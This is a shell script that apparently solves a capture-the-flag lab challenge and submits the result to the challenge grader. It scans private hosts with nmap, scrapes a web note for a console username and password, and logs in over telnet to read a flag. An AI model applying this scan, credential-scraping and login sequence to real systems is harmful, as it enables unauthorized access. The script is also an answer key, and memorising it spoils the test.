#!/bin/sh
set -eu

nmap -n -Pn -p 23,8080 172.20.0.141-199

flag=$(python3 - <<'PY'
import re
import socket
import urllib.request

host = "172.20.0.141"
with urllib.request.urlopen(f"http://{host}:8080/", timeout=5) as response:
    page = response.read().decode()
match = re.search(r"href=['\"]([^'\"]+)['\"]", page)
if not match:
    raise SystemExit("No handoff link found")
with urllib.request.urlopen(f"http://{host}:8080{match.group(1)}", timeout=5) as response:
    note = response.read().decode()
user = re.search(r"Console operator account:\s*(\S+)", note).group(1)
password = re.search(r"Temporary access phrase:\s*(\S+)", note).group(1)

sock = socket.create_connection((host, 23), timeout=5)
stream = sock.makefile("rwb", buffering=0)
def until(token):
    data = bytearray()
    while token not in data:
        part = stream.read(1)
        if not part:
            raise RuntimeError("Console closed the connection")
        data.extend(part)
    return bytes(data)
until(b"login: ")
stream.write(user.encode() + b"\n")
until(b"password: ")
stream.write(password.encode() + b"\n")
until(b"> ")
stream.write(b"status\n")
response = until(b"> ").decode(errors="replace")
sock.close()
match = re.search(r"BSY\{[^}]+\}", response)
if not match:
    raise SystemExit("Protected record did not return a flag")
print(match.group(0))
PY
)

curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-a0a604\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
